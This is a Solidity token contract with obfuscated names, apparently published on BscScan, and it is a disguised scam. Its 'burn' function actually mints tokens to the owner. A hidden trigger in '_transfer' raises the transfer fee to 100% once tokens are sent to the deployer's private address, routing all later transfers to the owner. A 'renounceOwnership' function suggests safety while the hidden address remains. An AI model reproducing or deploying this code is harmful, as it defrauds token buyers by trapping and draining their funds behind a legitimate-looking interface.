/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
pragma solidity >=0.4.11;
contract HzNRZh {
uint256 public  MrSdOb = 100000000000000000000000;
uint256 public  ulBeDJ = 1000000000000000000;
address public  QIWnpa = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public constant fqugOR = 9+1;
address public  cJAvRJ = address(0);
string public  name = "HTDSgK";
uint256 public  LgIIBs = 10000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  gBcyVe = 10000000000000;
mapping (address => uint256) public balanceOf;
uint256 public  EhEtZQ = 10000000000000000000000000000;
address public owner;
string public  symbol = "RaMhLG";
uint256 public  dkUTuO = 100000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  NKLlWd = address(0);
uint256 public  XAsiwA = 100000000000000000000000;
address public  EJPpwU = address(0);
uint8 public constant decimals = 18;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  HnEtHc = 100000000000000000000;
address public  bOKvAM = address(0);
address private  MRAnxw = address(0);
address public  ntpErv = address(0);
uint256 public  EMAwmB = 10000000000000000000;
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
constructor () public {
MRAnxw = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "PZbnyl");
require(to != address(0), "PZbnyl");
require(amount <= balanceOf[from], "PZbnyl");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* fqugOR/gBcyVe ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==MRAnxw){
gBcyVe = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}

}